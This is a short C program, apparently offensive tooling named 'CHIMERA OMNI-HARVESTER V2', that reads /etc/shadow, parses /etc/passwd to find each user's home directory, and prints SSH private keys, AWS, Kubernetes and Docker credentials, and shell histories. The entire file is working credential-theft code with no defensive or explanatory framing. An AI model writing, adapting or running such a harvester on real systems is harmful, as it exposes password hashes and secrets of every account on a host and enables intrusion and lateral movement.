#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

const char* target_files[] = {
    ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/known_hosts",
    ".aws/credentials", ".kube/config", ".docker/config.json",
    ".bash_history", ".zsh_history"
};

void harvest_file(const char* path) {
    FILE *fp = fopen(path, "r");
    if (!fp) return;
    printf("\n[!!!] PATH: %s\n", path);
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp)) printf("%s", buffer);
    fclose(fp);
}

int main() {
    printf("\n--- CHIMERA OMNI-HARVESTER V2 (MANUAL PARSE) ---\n");
    harvest_file("/etc/shadow");

    FILE *pw = fopen("/etc/passwd", "r");
    if (pw) {
        char line[256];
        while (fgets(line, sizeof(line), pw)) {
            char *name = strtok(line, ":");
            for (int i=0; i<5; i++) strtok(NULL, ":"); // Skip to home dir
            char *home = strtok(NULL, ":");
            
            if (home && strlen(home) > 1) {
                for (int i=0; i < 8; i++) {
                    char path[1024];
                    snprintf(path, sizeof(path), "%s/%s", home, target_files[i]);
                    harvest_file(path);
                }
            }
        }
        fclose(pw);
    }
    return 0;
}
